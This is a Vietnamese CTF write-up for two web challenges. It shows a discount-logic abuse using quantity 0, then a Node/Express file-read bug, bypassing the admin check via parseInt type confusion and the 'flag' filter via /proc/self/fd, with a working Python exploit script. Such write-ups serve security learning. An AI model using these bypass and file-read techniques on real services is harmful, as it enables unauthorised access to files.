# **H4ck0n CTF**

## **Faster FastAPI**

- Ở đây trang web có chức năng thanh toán và có thể được chiết khấu giá tiền xuống như sau: 

![](./img_H4ck0n/Screenshot%202023-08-29%20090242.png)

- Lập trình viên đã không xứ lý logic tốt chuyện này, điều này có nghĩa nếu ta không thực sự mua nó nhưng chúng ta vẫn được tiền chiết khấu. Bằng cách chúng ta sẽ sửa `quantity:0`. Và chúng ta gửi request liên tục và tiền sẽ tăng.

![](./img_H4ck0n/Screenshot%202023-08-29%20091028.png)

- Từ đấy, chúng ta nhận được flag như sau: `d4rk{cyth0n_1s_f4st_but_r1sky}c0d3`

## **Unhackable Cloud Storage**

- Ở bài này chúng ta sẽ phải tiếp cận trang web qua source của nó:

```javascript
import "dotenv/config";
import express from "express";
import fs from "fs";

const admin_id = 0;
const admin_password = process.env.ADMIN_PASSWORD;

const USERS = [[admin_id, admin_password]];

const app = express();

app.use((req, _, next) => {
    let data = "";
    req.setEncoding("utf8");
    req.on("data", (chunk) => {
        data += chunk;
    });

    req.on("end", () => {
        req.body = data;
        next();
    });
});

app.get("/register", (req, res) => {
    const userId = req.query.user_id ?? "";
    const userPassword = req.query.user_password ?? "";

    if (userId == admin_id) {
        res.send("[-] You can't register as an admin user");
    }

    USERS.push([userId, userPassword]);

    res.send(`[+] User '${userId}' registered`);
});

const authOnly = (req, res) => {
    const userId = req.query.user_id ?? "";
    const userPassword = req.query.user_password ?? "";

    const user = USERS.find((user) => user[0] == userId && user[1] == userPassword);

    if (!user) {
        res.send("[-] Invalid credentials. You need to register first.");
        return false;
    }

    return true;
};

const adminOnly = (req, res) => {
    const userId = req.query.user_id ?? "";
    if (parseInt(userId) != admin_id) {
        res.send("[-] Invalid credentials. Only admins can access this endpoint");
        return false;
    }

    return true;
};

app.get("/bucket", (req, res) => {
    if (!authOnly(req, res)) {
        return;
    }

    const filePath = (req.query.file_path ?? "").toString();
    if (!filePath.startsWith("/tmp")) {
        if (!adminOnly(req, res)) {
            return;
        }
    }

    res.send(getFileContent(filePath));
});

const getFileContent = (filePath) => {
    const f = fs.openSync(filePath, "r");

    if (filePath.includes("flag")) {
        return "[No flag for you]";
    }

    const buf = Buffer.alloc(100);
    fs.readSync(f, buf, 0, 100, 0);
    fs.closeSync(f);

    const fileContent = buf.toString();

    return fileContent;
};

app.listen(7500, () => {
    console.log("[+] API up and running");
});
```
- Chúng ta sẽ đi tìm hiểu từ dưới lên trên 

```javascript
app.get("/bucket", (req, res) => {
    if (!authOnly(req, res)) {// để bypass đoạn này chúng ta phải là người đã đăng kí tài khoản
        return;
    }

    const filePath = (req.query.file_path ?? "").toString();
    if (!filePath.startsWith("/tmp")) {// file path không được bắt đầu bằng /tmp
        if (!adminOnly(req, res)) { // Kiểm tra xem mình có phải admin không?
            return;
        }
    }

    res.send(getFileContent(filePath));
});

const authOnly = (req, res) => {
    const userId = req.query.user_id ?? "";
    const userPassword = req.query.user_password ?? "";

    const user = USERS.find((user) => user[0] == userId && user[1] == userPassword);

    if (!user) {
        res.send("[-] Invalid credentials. You need to register first.");
        return false;
    }

    return true;
};

const adminOnly = (req, res) => {
    const userId = req.query.user_id ?? "";
    if (parseInt(userId) != admin_id) {// nó sẽ check userId của tài khoản vậy làm sao chúng ta có thể bypass đoạn này. Hãy xem cách by pass của tôi dưới đây: Dữ liệu 
        res.send("[-] Invalid credentials. Only admins can access this endpoint");
        return false;
    }

    return true;
};


//////////////////////////////////////////////////////////////////////

// cách tôi có thể bypass 
> parseInt("0")
0 // Expected
> parseInt("0kien")
0 // Not Expected
> parseInt("But0")
NaN // Somewhat expected
```

- Và điều quan trọng tieeos theo của chúng ta là cần làm sao có thể đọc file flag. Khi họ đã ngăn mình khi file_path không có được kí tự flag. tôi lại nghĩ đến thư mục `/proc`. Từ đấy, tôi thử build local như sau: 

```shell
└─$ ps aux --forest | grep "node index.js" -B3
user    28540  0.1  0.1  13984  7832 pts/2    Ss   20:29   0:03 |   \_ /usr/bin/zsh
user    50233  3.0  1.4 727272 71000 pts/2    Sl+  21:12   0:02 |   |   \_ npm start
user    50261  0.0  0.0   2584  1536 pts/2    S+   21:12   0:00 |   |       \_ sh -c node index.js
user    50262  1.2  1.2 11132100 59964 pts/2  Sl+  21:12   0:01 |   |           \_ node index.js # <-- 
        ^^^^^ 
        PID

└─$ la /proc/50262/fd/
Permissions Size User Date Modified Name
lrwx------    64 user 27 Aug 21:13   0 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:12   1 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:12   2 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:13   3 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   4 -> pipe:[118660]
l-wx------    64 user 27 Aug 21:13   5 -> pipe:[118660]
lr-x------    64 user 27 Aug 21:13   6 -> pipe:[118661]
l-wx------    64 user 27 Aug 21:13   7 -> pipe:[118661]
lrwx------    64 user 27 Aug 21:13   8 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   9 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   10 -> pipe:[119393]
l-wx------    64 user 27 Aug 21:13   11 -> pipe:[119393]
lrwx------    64 user 27 Aug 21:13   12 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   13 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   14 -> pipe:[118662]
l-wx------    64 user 27 Aug 21:13   15 -> pipe:[118662]
lrwx------    64 user 27 Aug 21:13   16 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   17 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:13   18 -> /dev/null
lrwx------@   64 user 27 Aug 21:13   19 -> socket:[118670]
lrwx------    64 user 27 Aug 21:13   20 -> /dev/pts/2

# Register User
└─$ curl 'localhost:7500/register?user_id=Test&user_password=Test'                      
[+] User 'Test' registered

# Open File
└─$ curl 'localhost:7500/bucket?user_id=Test&user_password=Test&file_path=/tmp/flag.txt'
[No flag for you]     

└─$ la /proc/50262/fd/                                                                     
Permissions Size User Date Modified Name
lrwx------    64 user 27 Aug 21:23   0 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:22   1 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:22   2 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:23   3 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   4 -> pipe:[130433]
l-wx------    64 user 27 Aug 21:23   5 -> pipe:[130433]
lr-x------    64 user 27 Aug 21:23   6 -> pipe:[130434]
l-wx------    64 user 27 Aug 21:23   7 -> pipe:[130434]
lrwx------    64 user 27 Aug 21:23   8 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   9 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   10 -> pipe:[128748]
l-wx------    64 user 27 Aug 21:23   11 -> pipe:[128748]
lrwx------    64 user 27 Aug 21:23   12 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   13 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   14 -> pipe:[130435]
l-wx------    64 user 27 Aug 21:23   15 -> pipe:[130435]
lrwx------    64 user 27 Aug 21:23   16 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   17 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:23   18 -> /dev/null
lrwx------@   64 user 27 Aug 21:23   19 -> socket:[127948]
lrwx------    64 user 27 Aug 21:23   20 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:23   22 -> /tmp/flag.txt





└─$ cat /proc/50262/fd/22
d4rkc0de{KINZX203}   
```

- Vậy chúng ta có thể đọc file flag qua proc.

- Tôi đã viết một script khai thác như sau:

```python
import requests

URL = 'http://64.227.131.98:40002'
REGISTER = URL + '/register'
BUCKET   = URL + '/bucket'

# Register User
user = {"user_id": "0pwned", "user_password": "pwned"}
resp = requests.get(REGISTER, params=user)
print(resp.text)

# Open Flag
payload = {**user, "file_path": f"/app/flag.txt"}
resp = requests.get(BUCKET, params=payload)
print("[*] Flag Buffer Opened")

# Read FD
for i in range(32, 2, -1):
    payload = {**user, "file_path": f"/proc/self/fd/{i}"}
    resp = requests.get(BUCKET, params=payload)
    if resp.status_code != 500:
        print(f"Found Readable File: {resp.text}{' '*16}")
        if 'd4rk' in resp.text: break
    print(f"Trying File Descriptor: /proc/self/fd/{i}")    
```